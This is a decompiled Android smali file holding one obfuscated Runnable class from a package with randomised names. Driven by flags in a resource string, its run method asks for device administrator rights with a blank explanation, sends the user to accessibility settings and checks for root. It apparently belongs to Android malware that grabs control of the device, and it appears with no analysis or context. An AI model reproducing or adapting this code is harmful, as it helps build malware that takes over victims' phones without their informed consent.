.class Lcmf0/c3b5bm90zq/patch/C7$1;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C7;->b()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcmf0/c3b5bm90zq/patch/C7;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C7;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 8

    :try_start_0
    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C7;->a(Lcmf0/c3b5bm90zq/patch/C7;)Ljava/util/concurrent/locks/Lock;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/locks/Lock;->lock()V

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v0}, Lcmf0/c3b5bm90zq/patch/C7;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    const v1, 0x7f0c0021

    invoke-virtual {v0, v1}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v1

    const/16 v2, 0x31

    if-ne v1, v2, :cond_0

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-static {v1}, Lcmf0/c3b5bm90zq/patch/C7;->b(Lcmf0/c3b5bm90zq/patch/C7;)V

    :cond_0
    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v3

    if-ne v3, v2, :cond_1

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    new-instance v4, Lcmf0/c3b5bm90zq/patch/c;

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v5}, Lcmf0/c3b5bm90zq/patch/C7;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {v4, v5}, Lcmf0/c3b5bm90zq/patch/c;-><init>(Landroid/content/Context;)V

    iput-object v4, v3, Lcmf0/c3b5bm90zq/patch/C7;->a:Lcmf0/c3b5bm90zq/patch/c;

    iget-object v3, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    iget-object v3, v3, Lcmf0/c3b5bm90zq/patch/C7;->a:Lcmf0/c3b5bm90zq/patch/c;

    invoke-virtual {v3}, Lcmf0/c3b5bm90zq/patch/c;->a()Z

    move-result v3

    if-nez v3, :cond_1

    new-instance v3, Landroid/content/Intent;

    const-string v4, "android.app.action.ADD_DEVICE_ADMIN"

    invoke-direct {v3, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const-string v4, "android.app.extra.DEVICE_ADMIN"

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    iget-object v5, v5, Lcmf0/c3b5bm90zq/patch/C7;->a:Lcmf0/c3b5bm90zq/patch/c;

    invoke-virtual {v5}, Lcmf0/c3b5bm90zq/patch/c;->b()Landroid/content/ComponentName;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    const-string v4, "android.app.extra.ADD_EXPLANATION"

    const-string v5, ""

    invoke-virtual {v3, v4, v5}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v4, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    const/16 v5, 0x64

    invoke-virtual {v4, v3, v5}, Lcmf0/c3b5bm90zq/patch/C7;->startActivityForResult(Landroid/content/Intent;I)V

    :cond_1
    const/4 v3, 0x1

    invoke-virtual {v0, v3}, Ljava/lang/String;->charAt(I)C

    move-result v4

    if-ne v4, v2, :cond_2

    sget-boolean v4, Lcmf0/c3b5bm90zq/patch/C11;->j:Z

    if-nez v4, :cond_2

    new-instance v4, Landroid/content/Intent;

    invoke-direct {v4}, Landroid/content/Intent;-><init>()V

    const/high16 v5, 0x10000000

    invoke-virtual {v4, v5}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    const-string v5, "android.settings.ACCESSIBILITY_SETTINGS"

    invoke-virtual {v4, v5}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v5, v4}, Lcmf0/c3b5bm90zq/patch/C7;->startActivity(Landroid/content/Intent;)V

    :cond_2
    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v1

    const/4 v4, 0x0

    if-ne v1, v2, :cond_4

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    iget-object v1, v1, Lcmf0/c3b5bm90zq/patch/C7;->a:Lcmf0/c3b5bm90zq/patch/c;

    invoke-virtual {v1}, Lcmf0/c3b5bm90zq/patch/c;->a()Z

    move-result v1

    if-eqz v1, :cond_3

    goto :goto_0

    :cond_3
    const/4 v1, 0x0

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v1, 0x1

    :goto_1
    invoke-virtual {v0, v3}, Ljava/lang/String;->charAt(I)C

    move-result v5

    if-ne v5, v2, :cond_6

    sget-boolean v5, Lcmf0/c3b5bm90zq/patch/C11;->j:Z

    if-ne v5, v3, :cond_5

    goto :goto_2

    :cond_5
    const/4 v5, 0x0

    goto :goto_3

    :cond_6
    :goto_2
    const/4 v5, 0x1

    :goto_3
    if-ne v1, v3, :cond_b

    if-ne v5, v3, :cond_b

    iget-object v1, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v1}, Lcmf0/c3b5bm90zq/patch/C7;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    const/high16 v5, 0x7f0c0000

    invoke-virtual {v1, v5}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v5, ".."

    invoke-virtual {v1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_9

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v5}, Lcmf0/c3b5bm90zq/patch/C7;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-static {v5, v1}, Lcmf0/c3b5bm90zq/patch/C7;->a(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v5

    if-ne v5, v3, :cond_7

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-static {v5, v1}, Lcmf0/c3b5bm90zq/patch/C7;->a(Lcmf0/c3b5bm90zq/patch/C7;Ljava/lang/String;)V

    goto :goto_4

    :cond_7
    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    iget-object v5, v5, Lcmf0/c3b5bm90zq/patch/C7;->b:Lcmf0/c3b5bm90zq/patch/a;

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v6}, Lcmf0/c3b5bm90zq/patch/C7;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    const-string v7, "root"

    invoke-virtual {v5, v6, v7}, Lcmf0/c3b5bm90zq/patch/a;->a(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v6, "1"

    if-ne v5, v6, :cond_8

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-static {v5, v3}, Lcmf0/c3b5bm90zq/patch/C7;->a(Lcmf0/c3b5bm90zq/patch/C7;Z)V

    goto :goto_4

    :cond_8
    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-static {v5, v4}, Lcmf0/c3b5bm90zq/patch/C7;->a(Lcmf0/c3b5bm90zq/patch/C7;Z)V

    :cond_9
    :goto_4
    invoke-virtual {v0, v4}, Ljava/lang/String;->charAt(I)C

    move-result v0

    if-ne v0, v2, :cond_b

    const-string v0, ".."

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_a

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v0}, Lcmf0/c3b5bm90zq/patch/C7;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0, v1}, Lcmf0/c3b5bm90zq/patch/C7;->a(Landroid/content/Context;Ljava/lang/String;)Z

    move-result v0

    if-ne v0, v3, :cond_b

    :cond_a
    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-virtual {v0}, Lcmf0/c3b5bm90zq/patch/C7;->a()V

    :cond_b
    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C7$1;->a:Lcmf0/c3b5bm90zq/patch/C7;

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C7;->a(Lcmf0/c3b5bm90zq/patch/C7;)Ljava/util/concurrent/locks/Lock;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/locks/Lock;->unlock()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method
